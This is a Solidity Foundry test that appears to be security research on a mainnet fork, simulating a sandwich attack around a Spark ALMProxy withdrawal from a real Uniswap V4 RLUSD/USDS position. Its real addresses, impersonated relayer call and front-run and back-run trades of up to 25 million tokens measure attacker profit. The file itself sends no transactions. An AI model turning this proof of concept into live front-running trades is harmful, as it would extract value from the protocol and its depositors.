// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// PASSO 356. Fork-only local simulation. No broadcast and no mainnet writes.
// Victim removes part of an EXISTING ALMProxy Uniswap V4 position.
// The attacker trades from a separate synthetic balance. The ALMProxy is NOT funded.
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PoolKey} from "../../lib/uniswap-v4-core/src/types/PoolKey.sol";
import {Currency} from "../../lib/uniswap-v4-core/src/types/Currency.sol";
import {IV4Router} from "../../lib/uniswap-v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "../../lib/uniswap-v4-periphery/src/libraries/Actions.sol";

interface IRealLPPositionManager {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getPositionLiquidity(uint256 tokenId) external view returns (uint128);
    function poolKeys(bytes25 poolId) external view returns (PoolKey memory);
}
interface IRealLPController {
    function decreaseLiquidityUniswapV4(
        bytes32 poolId, uint256 tokenId, uint128 liquidityDecrease,
        uint128 amount0Min, uint128 amount1Min
    ) external;
}
interface IRealLPToken {
    function balanceOf(address owner) external view returns (uint256);
}
interface IRealLPPermit2 {
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}
interface IRealLPRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external;
}
interface IRealLPLimits {
    function getCurrentRateLimit(bytes32 key) external view returns (uint256);
}

contract SparkRealLPStress is Test {
    address constant PROXY = 0x1601843c5E9bC251A3272907010AFa41Fa18347E;
    address constant CONTROLLER = 0xc953972Cd006d1f12686fd7185c6D443b15900Cd;
    address constant RELAYER = 0x8a25A24EDE9482C4Fc0738F99611BE58F1c839AB;
    address constant RLUSD = 0x8292Bb45bf1Ee4d140127049757C2E0fF06317eD;
    address constant USDS = 0xdC035D45d973E3EC169d2276DDab16f1e407384F;
    address constant POSITION_MANAGER = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address constant ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address constant LIMITS = 0x7A5FD5cf045e010e62147F065cEAe59e5344b188;
    address constant ATTACKER = address(0x356356);
    bytes32 constant POOL = 0x9035721b23481db3888fd201b9c2b26dbc3af60258bca65e669f2ed98dc8eb4f;
    uint256 constant NFT = 385168;

    PoolKey internal key;
    uint128 internal withdrawLiq;

    function setUp() public {
        // Historical reproducibility: block used in Passo 355.
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 26495859);
        assertEq(IRealLPPositionManager(POSITION_MANAGER).ownerOf(NFT), PROXY, "NFT owner changed");
        key = IRealLPPositionManager(POSITION_MANAGER).poolKeys(bytes25(POOL));
        assertEq(keccak256(abi.encode(key)), POOL, "pool id mismatch");
        assertEq(Currency.unwrap(key.currency0), RLUSD, "unexpected token0");
        assertEq(Currency.unwrap(key.currency1), USDS, "unexpected token1");

        uint128 liq = IRealLPPositionManager(POSITION_MANAGER).getPositionLiquidity(NFT);
        assertGt(liq, 0, "zero NFT liquidity");
        withdrawLiq = liq / 100;
        assertGt(withdrawLiq, 0, "zero withdrawal fraction");

        // The only synthetic funds belong to the attacker. No deal() to ALMProxy.
        deal(RLUSD, ATTACKER, 30_000_000e18, false);
        deal(USDS, ATTACKER, 30_000_000e18, false);
        vm.startPrank(ATTACKER);
        _approve(RLUSD, PERMIT2, type(uint256).max);
        _approve(USDS, PERMIT2, type(uint256).max);
        IRealLPPermit2(PERMIT2).approve(RLUSD, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        IRealLPPermit2(PERMIT2).approve(USDS, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        vm.stopPrank();
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory out) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (out.length == 0 || (out.length == 32 && abi.decode(out, (bool)))), "ERC20 approval failed");
    }

    function _balance(address token, address owner) internal view returns (uint256) {
        return IRealLPToken(token).balanceOf(owner);
    }

    function _trade(address tokenIn, uint128 amountIn) internal returns (uint256 amountOut) {
        address tokenOut = tokenIn == RLUSD ? USDS : RLUSD;
        bytes memory actions = abi.encodePacked(
            uint8(Actions.SWAP_EXACT_IN_SINGLE), uint8(Actions.SETTLE_ALL), uint8(Actions.TAKE_ALL)
        );
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(IV4Router.ExactInputSingleParams({
            poolKey: key, zeroForOne: tokenIn == RLUSD, amountIn: amountIn,
            amountOutMinimum: 0, hookData: bytes("")
        }));
        params[1] = abi.encode(tokenIn, amountIn);
        params[2] = abi.encode(tokenOut, 0);
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);
        uint256 beforeOut = _balance(tokenOut, ATTACKER);
        vm.prank(ATTACKER);
        IRealLPRouter(ROUTER).execute(abi.encodePacked(uint8(0x10)), inputs, block.timestamp);
        amountOut = _balance(tokenOut, ATTACKER) - beforeOut;
    }

    function victimWithdraw() external returns (uint256 delta0, uint256 delta1) {
        require(msg.sender == address(this), "self only");
        uint256 before0 = _balance(RLUSD, PROXY);
        uint256 before1 = _balance(USDS, PROXY);
        vm.prank(RELAYER); // Only legitimate Spark transaction gets relayer role, on fork.
        IRealLPController(CONTROLLER).decreaseLiquidityUniswapV4(POOL, NFT, withdrawLiq, 0, 0);
        delta0 = _balance(RLUSD, PROXY) - before0;
        delta1 = _balance(USDS, PROXY) - before1;
    }

    function scenario(uint128 amount, bool frontWithUSDS, bool includeVictim)
        external returns (int256 pnl18, uint256 sparkReceived18, uint256 attackerGas)
    {
        require(msg.sender == address(this), "self only");
        uint256 before0 = _balance(RLUSD, ATTACKER);
        uint256 before1 = _balance(USDS, ATTACKER);
        address tokenIn = frontWithUSDS ? USDS : RLUSD;
        address tokenOut = frontWithUSDS ? RLUSD : USDS;
        uint256 gas1 = gasleft();
        uint256 out = _trade(tokenIn, amount);
        uint256 firstGas = gas1 - gasleft();
        if (includeVictim) {
            (uint256 d0, uint256 d1) = this.victimWithdraw();
            sparkReceived18 = d0 + d1;
        }
        require(out <= type(uint128).max, "reverse amount overflow");
        uint256 gas2 = gasleft();
        _trade(tokenOut, uint128(out));
        attackerGas = firstGas + (gas2 - gasleft());
        pnl18 = (int256(_balance(RLUSD, ATTACKER)) - int256(before0))
              + (int256(_balance(USDS, ATTACKER)) - int256(before1));
    }

    function testRealLPWithdrawExposure() public {
        bytes32 withdrawKey = keccak256(abi.encode(keccak256("LIMIT_UNISWAP_V4_WITHDRAW"), POOL));
        uint256 limit = IRealLPLimits(LIMITS).getCurrentRateLimit(withdrawKey);
        console2.log("=== PASSO 356: REAL NFT, REAL SPARK BALANCES ===");
        console2.log("Ethereum fork fixed block", block.number);
        console2.log("NFT", NFT);
        console2.log("Existing liquidity withdrawn", withdrawLiq);
        console2.log("Live withdrawal limit (18 decimals)", limit);
        console2.log("Victim has NO synthetic funding");

        uint256 snap = vm.snapshotState();
        uint256 baseline;
        try this.victimWithdraw() returns (uint256 d0, uint256 d1) {
            baseline = d0 + d1;
            console2.log("Baseline received RLUSD", d0 / 1e18);
            console2.log("Baseline received USDS", d1 / 1e18);
            console2.log("Baseline total 1e18", baseline);
        } catch Error(string memory reason) {
            console2.log("BASELINE FAILED", reason);
            revert("BASELINE_NOT_EXECUTABLE_AT_SNAPSHOT");
        } catch {
            revert("BASELINE_NOT_EXECUTABLE_AT_SNAPSHOT");
        }
        vm.revertToState(snap);

        uint256[6] memory amounts = [uint256(10_000), 500_000, 2_000_000, 8_000_000, 16_000_000, 25_000_000];
        uint256 passes;
        uint256 reversions;
        for (uint256 d; d < 2; d++) {
            bool withUSDS = d == 1;
            for (uint256 i; i < amounts.length; i++) {
                uint128 front = uint128(amounts[i] * 1e18);
                uint256 snapshot = vm.snapshotState();
                try this.scenario(front, withUSDS, false) returns (int256 control, uint256, uint256) {
                    console2.log("direction frontWithUSDS", withUSDS);
                    console2.log("front amount", amounts[i]);
                    console2.log("control PnL (1e18)", control);
                } catch {
                    console2.log("CONTROL REVERTED, amount", amounts[i]);
                }
                vm.revertToState(snapshot);

                snapshot = vm.snapshotState();
                try this.scenario(front, withUSDS, true)
                    returns (int256 profit, uint256 sparkOut, uint256 gasUsed)
                {
                    passes++;
                    console2.log("SCENARIO COMPLETED, frontWithUSDS", withUSDS);
                    console2.log("front amount", amounts[i]);
                    console2.log("attacker PnL 1e18 before gas", profit);
                    console2.log("Spark received relative to baseline 1e18", int256(sparkOut)-int256(baseline));
                    console2.log("attacker swap gas estimate", gasUsed);
                    // This does NOT prove protocol economic loss: leftover NFT + fees excluded.
                } catch Error(string memory reason) {
                    reversions++;
                    console2.log("SCENARIO REVERT", reason);
                } catch {
                    reversions++;
                    console2.log("SCENARIO REVERT (opaque)");
                }
                vm.revertToState(snapshot);
            }
        }
        console2.log("Completed LP scenarios", passes);
        console2.log("Reverted LP scenarios", reversions);
        console2.log("IMPORTANT: residual LP value and accrued fees NOT marked to market.");
        console2.log("FORK ONLY; NO MAINNET TRANSACTIONS SENT.");
    }
}
